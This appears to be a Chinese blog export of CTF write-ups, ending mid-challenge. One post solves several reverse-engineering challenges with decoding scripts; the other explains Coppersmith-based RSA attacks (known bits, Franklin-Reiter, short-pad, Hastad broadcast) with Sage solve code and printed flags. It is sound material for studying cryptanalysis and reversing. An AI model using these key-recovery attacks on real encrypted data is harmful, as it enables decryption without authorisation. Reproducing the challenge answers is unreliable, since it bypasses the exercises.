而case10为加密块，case11为验证块，提取出其中的数组，做异或即可得到flag 12345678910111213a=[0x56,0x0DA,0x0CD,0x3A,0x7E,0x86,0x13,0x0B5,0x1D,0x9D,0x0FC,0x97,0x8C,0x31,0x6B,0x0C9,0x0FB,0x1A,0x0E2,0x2D,0x0DC,0x0D3,0x0F1,0x0F4,0x36,0x9,0x20,0x42,0x4,0x6A,0x71,0x53,0x78,0x0A4,0x97,0x8F,0x7A,0x72,0x39,0x0E8,0x3D,0x0FA,0x40,0x3D]b=[0x5,0x8F,0x9E,0x79,0x2A,0x0C0,0x68,0x81,0x2D,0x0FC,0x0CF,0x0A4,0x0B5,0x55,0x5F,0x0E4,0x9D,0x23,0x0D6,0x1D,0x0F1,0x0E7,0x97,0x91,0x6,0x24,0x42,0x71,0x3C,0x58,0x5C,0x30,0x19,0x0C6,0x0F5,0x0BC,0x4B,0x42,0x5D,0x0DA,0x58,0x9B,0x24,0x40]s=''for i in range(len(a)): s+=chr(a[i]^b[i])print(s)# SUSCTF{40a339d4-f940-4fe0-b382-cabb310d2ead} [CFI-CTF 2018]Automated Reversing下载附件，得到一堆elf文件 拖进IDA里，只有汇编代码，不过逻辑还是挺简单的，只是做了加减、异或的操作，然后与一个数比较 那么我们可以做逆操作，利用固定偏移量依次提取出操作符、操作值和比较值，进行逆计算获取这些预期字符，看看它们是什么，然后就出flag了 下载的附件中含有生成代码和解题代码，这里附上 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# generator.py#!/usr/bin/env pythonfrom pwn import *from random import *text = &quot;&quot;&quot;Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula dolor. Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque eu, pretium quis, sem. Nulla consequat massa quis enim. Donec pede justo, fringilla vel, aliquet nec, vulputate eget, arcu. In enim justo, rhoncus ut, imperdiet a, venenatis vitae, justo. Nullam dictum felis eu pede mollis pretium. Integer tincidunt. Cras dapibus. The flag is CFI{1s_th1s_4_pr0g_ch4ll_0r_4_r3ve3se_ch4ll?}. Aenean vulputate eleifend tellus. Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. I stole this idea directly from Defcon Quals 2016. Phasellus viverra nulla ut metus varius laoreet. Quisque rutrum. Aenean imperdiet. Etiam ultricies nisi vel augue. Curabitur ullamcorper ultricies nisi. Nam eget dui. Etiam rhoncus. Maecenas tempus, tellus eget condimentum rhoncus, sem quam semper libero, sit amet adipiscing sem neque sed ipsum.&quot;&quot;&quot;context(arch='amd64')for i, c in enumerate(text): operator = [&quot;xor&quot;, &quot;sub&quot;, &quot;add&quot;][randint(0, 2)] key = randint(1, 100) if operator == &quot;xor&quot;: check = (ord(c) ^ key) &amp; 0xff if operator == &quot;sub&quot;: check = (ord(c) - key) &amp; 0xff if operator == &quot;add&quot;: check = (ord(c) + key) &amp; 0xff code = &quot;&quot;&quot; push 0 push 5 mov rdi, rsp mov rax, 0x23 syscall pop rax pop rax mov rax, [rsp + 0x10] mov dl, byte ptr [rax] {} dl, {} cmp dl, {} jne error mov rdi, 0 mov rax, 0x3c syscall error: mov rdi, 1 mov rax, 0x3c syscall &quot;&quot;&quot;.format(operator, key, check) with open(&quot;binaries/binary{}&quot;.format(i), &quot;w&quot;) as f: elf = make_elf(asm(code)) f.write(elf) 12345678910111213141516171819202122#solution.py#!/usr/bin/env pythonflag = &quot;&quot;for i in range(1007): path = &quot;binaries/binaries/binary{}&quot;.format(i) with open(path, &quot;rb&quot;) as f: binary = f.read() operator = binary[0xca] key = binary[0xcb] check = binary[0xce] if operator == 0xc2: # add flag += chr((check - key) &amp; 0xff) elif operator == 0xea: # sub flag += chr((check + key) &amp; 0xff) else: flag += chr(check ^ key)print(flag) [MRCTF2020 Virtual_tree]ida32打开，流程还是挺明白的 中间存在花指令，修复掉 进到sub_401680中，类似一颗树的前序遍历，取其中的对输入字符串做异或加密 动调提取出a1的数据： 1MLGPOKFCJENIHDBA 然后到sub_5F16F0，一开始以为一直调用的是sub_5f1510这个函数，只不过传入的参数每次都不一样 但实际上动调的时候我们可以发现，实际的函数是这样的…里面调用的函数被替换掉了 实际上分别是一些加减、异或的操作 接着逆即可,减法的时候需要注意绝对值的问题： 1234567891011121314151617181920212223a =[ 0x17, 0x63, 0x77, 0x03, 0x52, 0x2E, 0x4A, 0x28, 0x52, 0x1B, 0x17, 0x12, 0x3A, 0x0A, 0x6C, 0x62]a[15]=(a[15]-2)%256a[14]^=a[15]a[12]=(a[2]-a[12])%256a[11]^=a[12]a[10]=(a[7]-a[10])%256a[9]=(a[8]-a[9])%256a[8]^=a[7]a[7]=(a[7]-3)%256a[6]=a[1]-a[6]a[4]^=a[5]a[3]=(a[7]-a[3]%256)a[2]=(a[2]-7)%256a[1]^=a[2]a[0]=(a[0]-10)%256s='MLGPOKFCJENIHDBA'f=''for i in range(16): f+=chr(ord(s[i])^a[i])print(f) 一些去花小感想这题去花指令的过程挺曲折的 像这样的花指令，以往都是两条指令都nop掉，但实际上这样子操作是错误的，因为jump的时候跳到的还是下面的那条指令，只不过由于加了偏移量的关系，实际上执行的不是call xxxx这条指令，而是另一条指令，实际操作只需要将下面的指令nop一次，将余下的字节在重新整理为代码即可。 [羊城杯 2020]babyre下载文件，运行时会发现缺少了某个库而无法运行 原因是缺少了libcrypto.so.1.0.0这个库，安装这个库即可，命令如下 12wget http://archive.ubuntu.com/ubuntu/pool/main/o/openssl1.0/libssl1.0.0_1.0.2n-1ubuntu5.9_amd64.deb sudo dpkg -i libssl1.0.0_1.0.2n-1ubuntu5.9_amd64.deb 然后就可以快乐动调了 动调得到密钥数据 然后可以解main中的DES了 12345678910111213from Crypto.Cipher import DEStarget=[ 0x0A, 0xF4, 0xEE, 0xC8, 0x42, 0x8A, 0x9B, 0xDB, 0xA2, 0x26, 0x6F, 0xEE, 0xEE, 0xE0, 0xD8, 0xA2]cipher=b'\\x0A\\xF4\\xEE\\xC8\\x42\\x8A\\x9B\\xDB\\xA2\\x26\\x6F\\xEE\\xEE\\xE0\\xD8\\xA2'key=b'\\xAD\\x52\\xF3\\x4D\\xE2\\x2C\\x20\\xD6'print(len(key))cryptor=DES.new(key,DES.MODE_CBC,b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00')m=cryptor.decrypt(cipher)print(m)# th1s1sth3n1c3k3y 把其中SMC的代码调出 12345678910111213141516171819202122232425262728293031323334void __fastcall __noreturn sub_40272D(__int64 a1){ int i; // [rsp+18h] [rbp-128h] int j; // [rsp+1Ch] [rbp-124h] int k; // [rsp+24h] [rbp-11Ch] int l; // [rsp+28h] [rbp-118h] char v5[192]; // [rsp+30h] [rbp-110h] BYREF char s[16]; // [rsp+F0h] [rbp-50h] BYREF _BYTE v7[56]; // [rsp+100h] [rbp-40h] BYREF unsigned __int64 v8; // [rsp+138h] [rbp-8h] v8 = __readfsqword(0x28u); __isoc99_scanf(&quot;%40s&quot;, s); if ( (unsigned int)strlen(s) != 32 ) { puts(&quot;Wrong!&quot;); exit(0); } sub_400C91(v5, a1); sub_401B8E(v5, s); sub_401B8E(v5, v7); for ( i = 0; i &lt;= 31; ++i ) { for ( j = 0; i / 4 &gt; j; ++j ) s[i] ^= s[j]; } for ( k = 1; k &lt;= 31; ++k ) byte_6040D0[k - 1] = (2 * (s[k - 1] ^ 0x13) + 7) ^ ((unsigned __int8)s[k - 1] % 9u + s[k] + 2); if ( v7[15] == 0xC4 ) { for ( l = 0; l &lt;= 30; ++l ) ; }} 调出的代码还有点问题…但大概是出来了，只是中间比较的部分缺少了，只能看汇编了，其中byte_604100是要比较的数据 提取其中的数据 12345678910unsigned char ida_chars[] ={ 0xBD, 0xAD, 0xB4, 0x84, 0x10, 0x63, 0xB3, 0xE1, 0xC6, 0x84, 0x2D, 0x6F, 0xBA, 0x88, 0x74, 0xC4, 0x90, 0x32, 0xEA, 0x2E, 0xC6, 0x28, 0x65, 0x70, 0xC9, 0x75, 0x78, 0xA0, 0x0B, 0x9F, 0xA6, 0x00, 0x30, 0xE4, 0xD2, 0xC3, 0xEF, 0x75, 0xED, 0xA8, 0xE1, 0xA1, 0x73, 0x81, 0xE2, 0xE9, 0xAB, 0xC8, 0xBF, 0xCA, 0x52, 0xE8, 0xED, 0x6B, 0xA2, 0x39, 0x86, 0x21, 0xD0, 0xF6, 0x50, 0x3E, 0xF3, 0x5C}; 中间的加密函数是一个类似AES的结构 然后是两个异或加密，前一个可逆，后一个需要进行爆破 123456789101112131415161718192021222324252627282930313233343536373839from Crypto.Cipher import AESfrom Crypto.Util.number import *key=b'th1s1sth3n1c3k3y'cipher =[ 0xBD, 0xAD, 0xB4, 0x84, 0x10, 0x63, 0xB3, 0xE1, 0xC6, 0x84, 0x2D, 0x6F, 0xBA, 0x88, 0x74, 0xC4, 0x90, 0x32, 0xEA, 0x2E, 0xC6, 0x28, 0x65, 0x70, 0xC9, 0x75, 0x78, 0xA0, 0x0B, 0x9F, 0xA6, 0x00, 0x30, 0xE4, 0xD2, 0xC3, 0xEF, 0x75, 0xED, 0xA8, 0xE1, 0xA1, 0x73, 0x81, 0xE2, 0xE9, 0xAB, 0xC8, 0xBF, 0xCA, 0x52, 0xE8, 0xED, 0x6B, 0xA2, 0x39, 0x86, 0x21, 0xD0, 0xF6, 0x50, 0x3E, 0xF3, 0x5C]middle=[0]*32middle[31]=0xc4cryptor=AES.new(key,AES.MODE_ECB)def xor(): tmp_ar=[0]*32 for i in range(32): tmp_ar[i]=middle[i] for i in range(31,-1,-1): for j in range(0,i//4): tmp_ar[i]^=tmp_ar[j] f=b'' for i in range(32): f+=long_to_bytes(tmp_ar[i]) print(cryptor.decrypt(f)) def deep_search(i): if i==-1: # print(middle) xor() return for j in range(256): tmp=((2*(j^0x13)+7)^(j%9+middle[i+1]+2))&amp;0xff if tmp==cipher[i]: middle[i]=j deep_search(i-1)deep_search(30) 运行便可以得到flag了 [SWPU2019]EasiestRe做最简单的re，挨最毒的打 将加密函数隐藏在子进程，主要通过ReadProcessMemory和WriteProcessMemory这两个函数实现 在这之前我们需要先了解int 3这个指令，通过搜索我们可以发现int 3会引起异常 INT3断点是断点的一种，在诸如Ollydbg中的快捷键是F2，是一种很常用的断点类型。INT3指令的机器码为CC，所以通常也称之为CC指令。当被调试进程执行INT3指令导致一个异常时，调试器就会捕捉这个异常从而停在断点处，然后将断点处的指令恢复成原来的指令。 而ReadProcessMemory和WriteProcessMemory这两个函数中的基址参数为 1lpBaseAddress = DebugEvent.u.Exception.ExceptionRecord.ExceptionAddress; 也就是说，程序会捕捉子进程中引起异常的地方，对其中内容进行读取和改写 而决定改写地方和改写内容是通过nop数量来实现的 例如 那么我们要做的就是将参数v16和v15中的内容写到相应的地方来分析 首先将v16改写 然后是v15 然后就是对着算法开逆 [SUCTF2019]hardcpp脚本去除控制流平坦化 1python deflat.py .\\hardCpp 0x4007e0 核心代码不难 解题代码： 1234567891011121314151617181920212223enc =[ 0xF3, 0x2E, 0x18, 0x36, 0xE1, 0x4C, 0x22, 0xD1, 0xF9, 0x8C, 0x40, 0x76, 0xF4, 0x0E, 0x00, 0x05, 0xA3, 0x90, 0x0E, 0xA5,0x00]def encrypt(s): for i in range(1,21): cipher=s[i] v3=s[i-1]%7 cipher=(s[i]+v3)%256 v6=((s[i-1]^18)*3+2)%256 cipher=cipher^v6 flag=[ord('#')]for i in range(1,20): cipher=enc[i-1] v3=flag[i-1]%7 v6=((flag[i-1]^18)*3+2)%256 cipher=cipher^v6 flag.append(cipher-v3)s=''for i in range(len(flag)): s+=chr(flag[i])print(s)","link":"/2022/01/28/BUUOJ-Reverse-1/"},{"title":"Crypto-CopperSmith","text":"在RSA问题中，已知部分二进制位，可以通过coppersmith攻击还原出所有的二进制位。而借助格密码理论并从此扩展开来，对于其他的非对称密码算法，同样可以已知部分二进制位而还原所有的二进制位。 [toc] 定理本身现有一个 $e$ 阶的多项式 $f$ ，可以： 给定 $\\beta$ ，快速求出模某个 $n$ 的因数 $b$ 意义下较小的根，其中 $b \\geq n^{\\beta}, (0&lt;\\beta\\leq1)$ 在模 $b$ 意义下，快速求出 $n^{\\frac{\\beta^2}{e}}$ 以内的根 应用：高位攻击应用了第二条性质，此时构造的多项式 $f=p_{high}+p_{unknown}$，阶数 $e=1$ $\\beta$ 的定义：n的某个因数$ b$使得 $b\\geq n^{\\beta},(0&lt;\\beta \\leq 1)$ 而对于RSA问题，因数b一般为p或q。在p和q位数都为1024位的情况下，$\\beta=0.49$ 能够满足条件，即492位左右。其他情况则具体分析了。 在sagemath中应用coppersmith定理的函数有两个：small_root,coppersmith_howgrave_univariate 关于small_roots的使用方法： small_roots(X = ,beta = ) 有两个参数 X代表所需要求解根的上限；虽然是根的上限，并不是说上限越高越好，当上限超过某个值的时候就会计算失效，即使已知二进制位数满足条件，也无法用此函数求得结果；所以一般来说X取在给定情况下的最大求解上限 beta即是前面提到的β \\betaβ ，当p,q二进制位数相同时一般只能取0.4 0.40.4；如果p,q二进制位数不同，就按照之前的方法具体问题具体分析 实际操作下，未知位数小于等于454bits时(p,q均为1024bits)，可以运行coppersmith求解 123456789from Crypto.Util.number import getPrimep = getPrime(int(1024))q = getPrime(int(1024))n = p * qtest_bits = 454p_h = p &gt;&gt; test_bitsR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (p_h &lt;&lt; test_bits) + xf.small_roots(2**test_bits,0.4) 攻击类型Broadcast Attack with Linear PaddingRelated Message Attack当使用同一公钥对两个具有某种线性关系的消息 $M_1$ 和 $M_2$ 进行加密得到了 $C_1$ 和 $C_2$ ，若敌手获得了密文对，则可能可以获得对应的 $M_1$ 和 $M_2$。假设模数为 $N$ ，线性关系如下 M_1\\equiv f(M_2)\\ mod N \\\\ f=ax+b那么我们可以知道 C_1\\equiv M_1^e\\ mod\\ N\\\\ f(M_2)^e\\equiv M_1^e\\ mod\\ N\\\\ (aM_2+B)^e-C_1 \\equiv 0\\ mod\\ N以及 M_2^e-C_2\\equiv 0\\ mod\\ N也就是说，$M_2$是这两个式子的根，即 $x-M_2$ 同时整除这两个式子 f(x)^e-C_1\\\\ x^e-C_2因此，我们可以求得这两个多项式的最大公因子，如果最大公因子恰好是线性的，那么我们就求得了 $M_2$ ，值得注意的是 $e=3$ 时，最大公因子一定是线性的，证明过程可参考Coppersmith 相关攻击 - CTF Wiki (ctf-wiki.org)，这里直接引用结果 M_2\\equiv \\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}或者用sage，可以更简单地处理 1234567891011121314151617181920212223import binasciidef attack(c1, c2, b, e, n): PR.&lt;x&gt;=PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+b)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]c1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718Lc2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08Ln = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553e=3a = 1id1 = 1002id2 = 2614b = id2 - id1m1 = attack(c1,c2, b,e,n)print binascii.unhexlify(&quot;%x&quot; % int(m1 - id1)) Coppersmith’s short-pad attack如果padding长度过短，可能会导致对应的多项式的根过小，使得容易被攻击 设消息为M，padding长度为 $m=\\lfloor \\frac{k}{e^2} \\rfloor$ ，$M$ 的长度最多为k-m比特，padding方式如下 M_1=2^mM+r_1, 0\\le r_1\\le 2^m有 g_1(x)=x^e-C_1\\\\ g_2(x)=(x+r_2-r_1)-C_2显然两个方程具有同样的根 $M_1$ github上找的脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192# Franklin-Reiter attack against RSA.# If two messages differ only by a known fixed difference between the two messages# and are RSA encrypted under the same RSA modulus N# then it is possible to recover both of them.# Inputs are modulus, known difference, ciphertext 1, ciphertext2.# Ciphertext 1 corresponds to smaller of the two plaintexts. (The one without the fixed difference added to it)def franklinReiter(n,e,r,c1,c2): R.&lt;X&gt; = Zmod(n)[] f1 = X^e - c1 f2 = (X + r)^e - c2 # coefficient 0 = -m, which is what we wanted! return Integer(n-(compositeModulusGCD(f1,f2)).coefficients()[0]) # GCD is not implemented for rings over composite modulus in Sage # so we do our own implementation. Its the exact same as standard GCD, but with # the polynomials monic representationdef compositeModulusGCD(a, b): if(b == 0): return a.monic() else: return compositeModulusGCD(b, a % b)def CoppersmithShortPadAttack(e,n,C1,C2,eps=1/30): &quot;&quot;&quot; Coppersmith's Shortpad attack! Figured out from: https://en.wikipedia.org/wiki/Coppersmith's_attack#Coppersmith.E2.80.99s_short-pad_attack &quot;&quot;&quot; import binascii P.&lt;x,y&gt; = PolynomialRing(ZZ) ZmodN = Zmod(n) g1 = x^e - C1 g2 = (x+y)^e - C2 res = g1.resultant(g2) P.&lt;y&gt; = PolynomialRing(ZmodN) # Convert Multivariate Polynomial Ring to Univariate Polynomial Ring rres = 0 for i in range(len(res.coefficients())): rres += res.coefficients()[i]*(y^(res.exponents()[i][1])) diff = rres.small_roots(epsilon=eps) recoveredM1 = franklinReiter(n,e,diff[0],C1,C2) print(recoveredM1) print(&quot;Message is the following hex, but potentially missing some zeroes in the binary from the right end&quot;) print(hex(recoveredM1)) print(&quot;Message is one of:&quot;) for i in range(8): msg = hex(Integer(recoveredM1*pow(2,i))) if(len(msg)%2 == 1): msg = '0' + msg if(msg[:2]=='0x'): msg = msg[:2] print(binascii.unhexlify(msg))def testCoppersmithShortPadAttack(eps=1/25): from Crypto.PublicKey import RSA import random import math import binascii M = &quot;flag{This_Msg_Is_2_1337}&quot; M = int(binascii.hexlify(M),16) e = 3 nBitSize = 8192 key = RSA.generate(nBitSize) #Give a bit of room, otherwhise the epsilon has to be tiny, and small roots will take forever m = int(math.floor(nBitSize/(e*e))) - 400 assert (m &lt; nBitSize - len(bin(M)[2:])) r1 = random.randint(1,pow(2,m)) r2 = random.randint(r1,pow(2,m)) M1 = pow(2,m)*M + r1 M2 = pow(2,m)*M + r2 C1 = Integer(pow(M1,e,key.n)) C2 = Integer(pow(M2,e,key.n)) CoppersmithShortPadAttack(e,key.n,C1,C2,eps)def testFranklinReiter(): p = random_prime(2^512) q = random_prime(2^512) n = p * q # 1024-bit modulus e = 11 m = randint(0, n) # some message we want to recover r = randint(0, n) # random padding c1 = pow(m + 0, e, n) c2 = pow(m + r, e, n) print(m) recoveredM = franklinReiter(n,e,r,c1,c2) print(recoveredM) assert recoveredM==m print(&quot;They are equal!&quot;) return True Known High Bits Message AttackFactoring with High Bits KnownBoneh and Durfee attack$d&lt;N^{0.292}$时，可以使用该攻击 Hastad Broadcast Attack低指数广播域攻击，在使用线性填充时可以应用以下脚本（两种写法） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# sagedef linearPaddingHastads1(cArray, nArray, aArray, bArray, e=3, eps=1/8): &quot;&quot;&quot; Performs Hastads attack on raw RSA with no padding. This is for RSA encryptions of the form: cArray[i] = pow(aArray[i]*msg + bArray[i],e,nArray[i]) Where they are all encryptions of the same message. cArray = Ciphertext Array nArray = Modulus Array aArray = Array of 'slopes' for the linear padding bArray = Array of 'y-intercepts' for the linear padding e = public exponent &quot;&quot;&quot; if(len(cArray) == len(nArray) == len(aArray) == len(bArray) == e): for i in range(e): cArray[i] = Integer(cArray[i]) nArray[i] = Integer(nArray[i]) aArray[i] = Integer(aArray[i]) bArray[i] = Integer(bArray[i]) TArray = [-1]*e for i in range(e): arrayToCRT = [0]*e arrayToCRT[i] = 1 TArray[i] = crt(arrayToCRT, nArray) P.&lt;x&gt; = PolynomialRing(Zmod(prod(nArray))) gArray = [-1]*e for i in range(e): gArray[i] = TArray[i]*(pow(aArray[i]*x + bArray[i], e) - cArray[i]) g = sum(gArray) g = g.monic() # Use Sage's inbuilt coppersmith method roots = g.small_roots(epsilon=eps) if(len(roots) == 0): print(&quot;No Solutions found&quot;) return -1 return roots[0] else: print(&quot;CiphertextArray, ModulusArray, and the linear padding arrays need to be of the same length,&quot; + &quot;and the same size as the public exponent&quot;)def linearPaddingHastads2(cArray, nArray, aArray, bArray, e=3, eps=1/8): cnt = e PR = PolynomialRing(ZZ, 'x') x = PR.gen() Fs = [] for i in range(cnt): f = PR((A[i]*x + B[i])**e - Cs[i]) ff = f.change_ring(Zmod(Ns[i])) ff = ff.monic() f = ff.change_ring(ZZ) Fs.append(f) F = crt(Fs, Ns) M = reduce(lambda x, y: x * y, Ns) FF = F.change_ring(Zmod(M)) m = FF.small_roots(epsilon=1/16) if m: return m[0] else: return None SMUPE问题模数不同、加密指数也不同 123456789101112131415161718192021Cs = [...]PKs = [(3,..), (3,..), (5,..), (5,..)]cnt = 4A = []B = []PR = PolynomialRing(ZZ, 'x')x = PR.gen()Fs = []for i in range(cnt): f = PR( ( A[i]*x + B[i] )**PKs[i][0] - Cs[i] ) ff = f.change_ring( Zmod(PKs[i][1]) ) ff = ff.monic() f = ff.change_ring(ZZ) Fs.append(f)F = crt( [ Fs[0]**2, Fs[1]**2, x*Fs[2], x*Fs[3] ], [ PKs[i][1] for i in range(cnt) ] )M = reduce( lambda x, y: x * y, [ PKs[i][1] for i in range(cnt) ] )FF = F.change_ring( Zmod(M) )m = FF.small_roots(X=2**760, beta=7./8)[0]print(m) 练习题目：[鹤城杯 2021]babyrsaDescription:123456789101112131415from Crypto.Util.number import getPrime, bytes_to_longfrom secret import flagp = getPrime(1024)q = getPrime(1024)n = p * qe = 65537hint1 = p &gt;&gt; 724hint2 = q % (2 ** 265)ct = pow(bytes_to_long(flag), e, n)print(hint1)print(hint2)print(n)print(ct) Analysis Solving code123456789101112131415161718192021222324252627from Crypto.Util.number import *import gmpy2p_high = 1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479q_low = 40812438243894343296354573724131194431453023461572200856406939246297219541329623n = 21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969enc = 19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188e = 65537mod = pow(2,265)p0 = n * inverse_mod(q_low,mod) % modPR.&lt;x&gt; = PolynomialRing(Zmod(n))for i in range(2**5): f = p_high * (2^724) + p0 + (x * 32 + i) * mod f = f.monic() out_p = f.small_roots(2^454,0.4) if len(out_p) != 0: print(out_p[0]) breakp = (out_p[0] * 32 + i) * mod + p_high * (2^724) + p0# print(p)p = 133637329398256221348922087205912367118213472434713498908220867690672019569057789598459580146410501473689139466275052698529257254973211963162087316149628000798221014338373126500646873612341158676084318494058522014519669302359038980726479317742766438142835169562422371156257894374341629012755597863752154328407assert n % p == 0q = n // pfai_n = (p-1) * (q-1)d = inverse_mod(e,fai_n)m = pow(enc,d,n)print(bytes.decode(long_to_bytes(m))) 强网杯2019 Copperstudychallenge1明文泄露高位 1234567891011121314151617[+]Generating challenge 1 [+]n=13112061820685643239663831166928327119579425830632458568801544406506769461279590962772340249183569437559394200635526183698604582385769381159563710823689417274479549627596095398621182995891454516953722025068926293512505383125227579169778946631369961753587856344582257683672313230378603324005337788913902434023431887061454368566100747618582590270385918204656156089053519709536001906964008635708510672550219546894006091483520355436091053866312718431318498783637712773878423777467316605865516248176248780637132615807886272029843770186833425792049108187487338237850806203728217374848799250419859646871057096297020670904211 [+]e=3[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=15987554724003100295326076036413163634398600947695096857803937998969441763014731720375196104010794555868069024393647966040593258267888463732184495020709457560043050577198988363754703741636088089472488971050324654162166657678376557110492703712286306868843728466224887550827162442026262163340935333721705267432790268517[+]((m&gt;&gt;72)&lt;&lt;72)=2519188594271759205757864486097605540135407501571078627238849443561219057751843170540261842677239681908736[-]long_to_bytes(m).encode('hex')=$ 464c41477b325e3872736137353839363933666336383963373763356635323632643635343237323432377dchallenge1 completed solve: 123456789101112from Crypto.Util.number import *import gmpy2n=13112061820685643239663831166928327119579425830632458568801544406506769461279590962772340249183569437559394200635526183698604582385769381159563710823689417274479549627596095398621182995891454516953722025068926293512505383125227579169778946631369961753587856344582257683672313230378603324005337788913902434023431887061454368566100747618582590270385918204656156089053519709536001906964008635708510672550219546894006091483520355436091053866312718431318498783637712773878423777467316605865516248176248780637132615807886272029843770186833425792049108187487338237850806203728217374848799250419859646871057096297020670904211e=3c=15987554724003100295326076036413163634398600947695096857803937998969441763014731720375196104010794555868069024393647966040593258267888463732184495020709457560043050577198988363754703741636088089472488971050324654162166657678376557110492703712286306868843728466224887550827162442026262163340935333721705267432790268517m_high=2519188594271759205757864486097605540135407501571078627238849443561219057751843170540261842677239681908736bits=72P.&lt;x&gt;=PolynomialRing(Zmod(n))f=(m_high+x)^e-cm_low=f.small_roots(2&lt;&lt;bits,0.4)m=m_high+m_low[0]print(hex(m)[2:].zfill(64)) challenge2description 因子高位泄露攻击 1234567891011121314151617[+]Generating challenge 2 [+]n=12784625729032789592766625203074018101354917751492952685083808825504221816847310910447532133616954262271205877651255598995305639194329607493047941212754523879402744065076183778452640602625242851184095546100200565113016690161053808950384458996881574266573992526357954507491397978278604102524731393059303476350167738237822647246425836482533150025923051544431330502522043833872580483142594571802189321599016725741260254170793393777293145010525686561904427613648184843619301241414264343057368192416551134404100386155751297424616254697041043851852081071306219462991969849123668248321130382231769250865190227630009181759219 [+]e=65537[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=627824086157119245056478875800598959553774250161670787506083253960788230737588761787385686125828765665617567887904228030839535317987589608761534500003128247164233774794784231518212804270056404565710426613938264302998015421153393879729263551292024543756422702956470022959537221269172084619081368498693930550456153543628170306324206266216348386707008661128717431426237486511309767286175518238620230507201952867261283880986868752676549613958785288914989429224582849218395471672295410036858881836363364885164276983237312235831591858044908369376855484127614933545955544787160352042318378588039587911741028067576722790778[+]((p&gt;&gt;128)&lt;&lt;128)=97522826022187678545924975588711975512906538181361325096919121233043973599759518562689050415761485716705615149641768982838255403594331293651224395590747133152128042950062103156564440155088882592644046069208405360324372057140890317518802130081198060093576841538008960560391380395697098964411821716664506908672[-]long_to_bytes(m).encode('hex')=$ 464c41477b325e3872736136653237376633353564626536646133656464366633353664326462366436667dchallenge2 completed solve: 12345678910111213141516171819from gmpy2 import invertn=12784625729032789592766625203074018101354917751492952685083808825504221816847310910447532133616954262271205877651255598995305639194329607493047941212754523879402744065076183778452640602625242851184095546100200565113016690161053808950384458996881574266573992526357954507491397978278604102524731393059303476350167738237822647246425836482533150025923051544431330502522043833872580483142594571802189321599016725741260254170793393777293145010525686561904427613648184843619301241414264343057368192416551134404100386155751297424616254697041043851852081071306219462991969849123668248321130382231769250865190227630009181759219e=65537c=627824086157119245056478875800598959553774250161670787506083253960788230737588761787385686125828765665617567887904228030839535317987589608761534500003128247164233774794784231518212804270056404565710426613938264302998015421153393879729263551292024543756422702956470022959537221269172084619081368498693930550456153543628170306324206266216348386707008661128717431426237486511309767286175518238620230507201952867261283880986868752676549613958785288914989429224582849218395471672295410036858881836363364885164276983237312235831591858044908369376855484127614933545955544787160352042318378588039587911741028067576722790778p_high=97522826022187678545924975588711975512906538181361325096919121233043973599759518562689050415761485716705615149641768982838255403594331293651224395590747133152128042950062103156564440155088882592644046069208405360324372057140890317518802130081198060093576841538008960560391380395697098964411821716664506908672bits=128P.&lt;x&gt;=PolynomialRing(Zmod(n))f=(p_high)+xp_low=f.small_roots(2&lt;&lt;bits,0.4)[0]p=p_high+p_lowprint(p)p=97522826022187678545924975588711975512906538181361325096919121233043973599759518562689050415761485716705615149641768982838255403594331293651224395590747133152128042950062103156564440155088882592644046069208405360324372057140890317518802130081198060093576841538008960560661715295741651653499691458486798196487q=n//pprint(q)phi=(p-1)*(q-1)d=invert(e,phi)m=pow(c,d,n)print(hex(m)[2:].zfill(64)) challenge3description 私钥低位泄露 1234567891011121314151617[+]Generating challenge 3 